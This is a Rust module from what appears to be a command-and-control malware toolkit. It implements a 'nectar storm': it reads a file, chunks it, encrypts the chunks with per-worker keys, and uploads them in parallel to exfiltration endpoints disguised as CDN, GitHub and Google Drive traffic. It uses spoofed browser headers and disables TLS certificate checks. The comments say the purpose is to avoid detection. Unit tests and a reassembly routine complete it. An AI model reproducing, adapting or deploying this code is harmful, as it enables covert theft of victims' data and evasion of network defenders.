// Nectar: High-speed parallel exfiltration ("tormenta de néctar").
// Workers act as "cargo bees" that chunk data, encrypt with distinct keys,
// and exfiltrate simultaneously to multiple C2 endpoints or cloud sinks.
// Reduces exfiltration time drastically — critical for avoiding detection.

use crate::crypto::{encrypt_chacha20, derive_key};
use std::time::{Duration, Instant};
use tracing::{info, warn};

/// Configuration for a nectar storm exfiltration run.
pub struct NectarStorm {
    pub chunk_size: usize,          // bytes per chunk (default 64KB)
    pub parallel_workers: usize,    // max concurrent uploads
    pub c2_endpoints: Vec<String>,  // C2 URLs / cloud sinks
    pub encryption_seeds: Vec<String>, // distinct encryption seeds per worker
    pub timeout_secs: u64,
    pub camo_headers: Vec<(String, String)>, // mimicked HTTP headers
}

impl Default for NectarStorm {
    fn default() -> Self {
        Self {
            chunk_size: 65536,
            parallel_workers: 4,
            c2_endpoints: vec![
                "https://cdn.jsdelivr.net/api/analytics".into(),
                "https://cdnjs.cloudflare.com/ping".into(),
                "https://api.github.com/repos/org/repo".into(),
                "https://www.googleapis.com/upload/drive".into(),
            ],
            encryption_seeds: (1..=8).map(|i| format!("NECTAR_SEED_WORKER_{}", i)).collect(),
            timeout_secs: 30,
            camo_headers: vec![
                ("User-Agent".into(), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0".into()),
                ("Accept".into(), "application/json, text/plain".into()),
                ("Content-Type".into(), "application/octet-stream".into()),
                ("X-Requested-With".into(), "XMLHttpRequest".into()),
            ],
        }
    }
}

/// Chunk a file into encrypted segments for parallel exfiltration.
pub struct NectarChunk {
    pub index: usize,
    pub data: Vec<u8>,
    pub checksum: [u8; 32],
    pub worker_id: usize,
}

/// Split and encrypt a file for the nectar storm.
pub fn prepare_storm(
    file_path: &str,
    storm: &NectarStorm,
) -> Result<Vec<NectarChunk>, String> {
    let data = std::fs::read(file_path)
        .map_err(|e| format!("read {}: {}", file_path, e))?;

    let chunks: Vec<_> = data.chunks(storm.chunk_size).collect();
    let total = chunks.len();
    let mut nectar_chunks = Vec::with_capacity(total);

    for (i, chunk) in chunks.iter().enumerate() {
        let seed = &storm.encryption_seeds[i % storm.encryption_seeds.len()];
        let key = derive_key(seed);
        let encrypted = encrypt_chacha20(chunk, &key);

        let mut checksum = [0u8; 32];
        use sha2::{Sha256, Digest};
        let mut hasher = Sha256::new();
        hasher.update(&encrypted);
        checksum.copy_from_slice(&hasher.finalize());

        nectar_chunks.push(NectarChunk {
            index: i,
            data: encrypted,
            checksum,
            worker_id: i % storm.parallel_workers,
        });
    }

    info!("NECTAR: prepared {} chunks from {} ({} bytes)", total, file_path, data.len());
    Ok(nectar_chunks)
}

/// Execute a nectar storm: upload all chunks in parallel.
/// Returns (chunks_uploaded, total_chunks, elapsed_ms).
pub async fn execute_storm(
    chunks: Vec<NectarChunk>,
    storm: NectarStorm,
) -> (usize, usize, u128) {
    let start = Instant::now();
    let total = chunks.len();

    let client = reqwest::Client::builder()
        .timeout(Duration::from_secs(storm.timeout_secs))
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap_or_else(|_| reqwest::Client::new());

    let mut tasks = Vec::new();
    for chunk in chunks {
        let endpoint = storm.c2_endpoints[chunk.worker_id % storm.c2_endpoints.len()].clone();
        let data = chunk.data.clone();
        let idx = chunk.index;
        let client = client.clone();
        let headers = storm.camo_headers.clone();

        tasks.push(tokio::spawn(async move {
            let mut req = client.post(endpoint.clone());
            for (k, v) in &headers {
                req = req.header(k, v);
            }
            req = req.header("X-Chunk-Index", idx.to_string())
                   .body(data);

            match req.send().await {
                Ok(resp) => {
                    let ok = resp.status().is_success();
                    if !ok {
                        warn!("NECTAR: chunk {} to {} returned {}", idx, endpoint, resp.status());
                    }
                    (idx, ok)
                }
                Err(e) => {
                    warn!("NECTAR: chunk {} upload failed: {}", idx, e);
                    (idx, false)
                }
            }
        }));
    }

    let mut uploaded = 0usize;
    let results = futures::future::join_all(tasks).await;
    for result in results {
        if let Ok((_, true)) = result {
            uploaded += 1;
        }
    }

    let elapsed = start.elapsed().as_millis();
    let rate = if elapsed > 0 { (total * storm.chunk_size) as f64 / elapsed as f64 * 1000.0 / 1_048_576.0 } else { 0.0 };

    info!("NECTAR storm: {}/{} chunks in {}ms ({:.1} MB/s)",
        uploaded, total, elapsed, rate);
    (uploaded, total, elapsed)
}

/// Reassemble nectar chunks into the original file.
pub fn reassemble_storm(
    chunks: &[NectarChunk],
    storm: &NectarStorm,
) -> Result<Vec<u8>, String> {
    let total = chunks.len();
    let mut data = vec![0u8; total * storm.chunk_size];
    let mut recovered = 0usize;

    let mut sorted: Vec<&NectarChunk> = chunks.iter().collect();
    sorted.sort_by_key(|c| c.index);

    for chunk in &sorted {
        let seed = &storm.encryption_seeds[chunk.index % storm.encryption_seeds.len()];
        let key = derive_key(seed);
        let decrypted = crate::crypto::decrypt_chacha20(&chunk.data, &key)
            .ok_or_else(|| format!("decrypt chunk {} failed", chunk.index))?;

        let offset = chunk.index * storm.chunk_size;
        if offset + decrypted.len() <= data.len() {
            data[offset..offset + decrypted.len()].copy_from_slice(&decrypted);
            recovered += 1;
        }
    }

    info!("NECTAR: reassembled {}/{} chunks ({:.0} KB)", recovered, total, data.len() as f64 / 1024.0);
    Ok(data)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_prepare_small_file() {
        let tmp = "/tmp/nectar_test_small.dat";
        std::fs::write(tmp, b"Hello Nectar Storm!").unwrap();
        let storm = NectarStorm { chunk_size: 8, ..Default::default() };
        let chunks = prepare_storm(tmp, &storm).unwrap();
        assert!(chunks.len() >= 2, "Should split into at least 2 chunks");
        std::fs::remove_file(tmp).ok();
    }

    #[test]
    fn test_roundtrip() {
        let tmp = "/tmp/nectar_test_rt.dat";
        let original = vec![0xAAu8; 4096];
        std::fs::write(tmp, &original).unwrap();
        let storm = NectarStorm { chunk_size: 1024, ..Default::default() };
        let chunks = prepare_storm(tmp, &storm).unwrap();
        let reassembled = reassemble_storm(&chunks, &storm).unwrap();
        assert_eq!(&reassembled[..original.len()], &original[..]);
        std::fs::remove_file(tmp).ok();
    }

    #[test]
    fn test_encryption_per_chunk() {
        let storm = NectarStorm::default();
        let chunks = vec![
            NectarChunk { index: 0, data: vec![1u8; 64], checksum: [0;32], worker_id: 0 },
            NectarChunk { index: 1, data: vec![2u8; 64], checksum: [0;32], worker_id: 1 },
        ];
        let reassembled = reassemble_storm(&chunks, &storm);
        assert!(reassembled.is_ok());
    }
}
